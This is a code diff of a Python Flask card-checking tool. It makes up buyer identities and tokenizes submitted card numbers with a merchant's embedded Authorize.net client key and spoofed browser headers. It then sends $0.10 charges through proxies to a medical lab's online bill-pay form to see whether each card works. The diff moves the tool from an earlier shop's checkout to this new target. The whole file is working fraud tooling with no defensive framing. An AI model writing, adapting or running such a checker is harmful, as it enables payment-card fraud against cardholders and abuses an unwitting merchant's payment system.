@@ -3,7 +3,6 @@ import requests
 import uuid
 import json
 import time
-from requests_toolbelt.multipart.encoder import MultipartEncoder
 from faker import Faker
 import random
 
@@ -24,97 +23,81 @@ def random_gmail():
     user = faker.user_name() + str(random.randint(1000, 99999))
     return f"{user}@gmail.com"
 
-def get_token(card, month, year, cvv, zip_code, name):
+def get_token(card, month, year, cvv):
     url = 'https://api2.authorize.net/xml/v1/request.api'
     headers = {
         'Content-Type': 'application/json; charset=UTF-8',
-        'Origin': 'https://nbda.com',
-        'Referer': 'https://nbda.com/',
-        'User-Agent': 'Mozilla/5.0'
+        'Origin': 'https://avanticmedicallab.com',
+        'Referer': 'https://avanticmedicallab.com/',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
     }
     payload = {
         "securePaymentContainerRequest": {
             "merchantAuthentication": {
-                "name": "3c5Q9QdJW",  # updated token name
-                "clientKey": "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"  # updated token key
+                "name": "3c5Q9QdJW",
+                "clientKey": "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
             },
             "data": {
                 "type": "TOKEN",
                 "id": str(uuid.uuid4()),
                 "token": {
                     "cardNumber": card,
-                    "expirationDate": f"{int(month):02d}{year[-2:]}",
-                    "cardCode": cvv,
-                    "zip": zip_code,
-                    "fullName": name
+                    "expirationDate": f"{month}{year[-2:]}",
+                    "cardCode": cvv
                 }
             }
         }
     }
-    try:
-        r = requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=30)
-        r.raise_for_status()
-        json_data = json.loads(r.content.decode('utf-8-sig'))
-        print("Authorize.net Response:", json_data)  # For debugging
-        token = json_data["opaqueData"]["dataValue"]
-        return token
-    except Exception as e:
-        print("[x] Token generation failed:", e)
-        if 'r' in locals():
-            print("Status:", r.status_code)
-            print("Response:", r.text)
-        raise Exception(str(e))
+    r = requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=30)
+    data = json.loads(r.content.decode('utf-8-sig'))
+    if data.get("messages", {}).get("resultCode") == "Ok":
+        return data["opaqueData"]["dataValue"]
+    else:
+        raise Exception(f"Token gen failed: {data}")
 
-def send_to_checkout(token, name, email):
-    fields = {
-        'nam': name,
-        'eml': email,
-        'xbs': 'NBDA Shop',
-        'xlo': 'New York',
-        'crd[nam]': name,
-        'crd[ad1]': '123 Main St',
-        'crd[zip]': '10080',
-        'crd[cot]': 'New York County',
-        'crd[sta]': 'NY',
-        'crd[con]': 'US',
-        'crd[cit]': 'New York',
-        'crd[loc][0]': '-74.0156903',
-        'crd[loc][1]': '40.7130922',
-        'crd[tok]': token,
-        'sum': '10',
-        'itm[0][_id]': '60b163ea3936fc18ee3b11a9',
-        'itm[0][qty]': '1'
-    }
+def send_to_checkout(opaque_value, month, year, name, email, phone, address, city, state, postal):
+    url = "https://avanticmedicallab.com/wp-admin/admin-ajax.php"
+    boundary = "----WebKitFormBoundarycIcTvR9jbjEQpqRD"
 
-    m = MultipartEncoder(fields=fields)
+    payload = (
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][1][first]\"\r\n\r\n{name.split()[0]}\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][1][last]\"\r\n\r\n{name.split()[-1]}\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][17]\"\r\n\r\n0.10\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][2]\"\r\n\r\n{email}\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][3]\"\r\n\r\n{phone}\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][14]\"\r\n\r\nTest Data\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][4][address1]\"\r\n\r\n{address}\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][4][city]\"\r\n\r\n{city}\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][4][state]\"\r\n\r\n{state}\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][4][postal]\"\r\n\r\n{postal}\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][6]\"\r\n\r\n$ 0.10\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][11][]\"\r\n\r\nBy clicking on Pay Now button you have read and agreed to the policies set forth in both the Privacy Policy and the Terms and Conditions pages.\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[id]\"\r\n\r\n4449\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[author]\"\r\n\r\n1\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[post_id]\"\r\n\r\n3388\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[authorize_net][opaque_data][descriptor]\"\r\n\r\nCOMMON.ACCEPT.INAPP.PAYMENT\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[authorize_net][opaque_data][value]\"\r\n\r\n{opaque_value}\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[authorize_net][card_data][expire]\"\r\n\r\n{month}/{year}\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[token]\"\r\n\r\n878a34345981edcaa5a5541983911264\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nwpforms_submit\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"page_url\"\r\n\r\nhttps://avanticmedicallab.com/pay-bill-online/\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"page_title\"\r\n\r\nPay Bill Online\r\n"
+        f"{boundary}\r\nContent-Disposition: form-data; name=\"page_id\"\r\n\r\n3388\r\n"
+        f"{boundary}--\r\n"
+    )
+
     headers = {
-        'Content-Type': m.content_type,
-        'Origin': 'https://nbda.com',
-        'Referer': 'https://nbda.com/',
-        'User-Agent': 'Mozilla/5.0',
-        'x-org': '22350'
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "content-type": f"multipart/form-data; boundary={boundary[2:]}",
+        "origin": "https://avanticmedicallab.com",
+        "referer": "https://avanticmedicallab.com/pay-bill-online/",
+        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+        "x-requested-with": "XMLHttpRequest",
+        "cookie": "_wpfuuid=457527fe-c388-4f24-951a-a93db204f94d"
     }
 
-    try:
-        r = requests.post(
-            'https://api.membershipworks.com/v2/form/60b161d2b8a6f72e2f5433c6/checkout',
-            headers=headers,
-            data=m,
-            proxies=proxies,
-            timeout=180
-        )
-        try:
-            parsed = json.loads(r.text)
-            msg = parsed.get("error", "Success")
-        except Exception:
-            if r.status_code == 200:
-                msg = "Success"
-            else:
-                msg = f"HTTP {r.status_code}"
-        return msg
-    except Exception as e:
-        print("[x] Checkout request failed:", e)
-        return str(e)
+    r = requests.post(url, data=payload, headers=headers, proxies=proxies, timeout=30)
+    return r.text
 
 @app.route('/process', methods=['GET', 'POST'])
 def process():
@@ -131,14 +114,19 @@ def process():
 
     name = random_name()
     email = random_gmail()
-    amount = 10
+    phone = f"({faker.random_int(200, 999)}) {faker.random_int(200, 999)}-{faker.random_int(1000, 9999)}"
+    address = faker.street_address()
+    city = "New York"
+    state = "NY"
+    postal = "10080"
+    amount = 0.10
 
     try:
-        token = get_token(card, mm, yy, cvv, "10080", name)
+        token = get_token(card, mm, yy, cvv)
     except Exception as e:
         return jsonify({"error": "Token generation failed", "detail": str(e)}), 500
 
-    message = send_to_checkout(token, name, email)
+    message = send_to_checkout(token, mm, yy, name, email, phone, address, city, state, postal)
     time_taken = round(time.time() - start_time, 3)
 
     return jsonify({
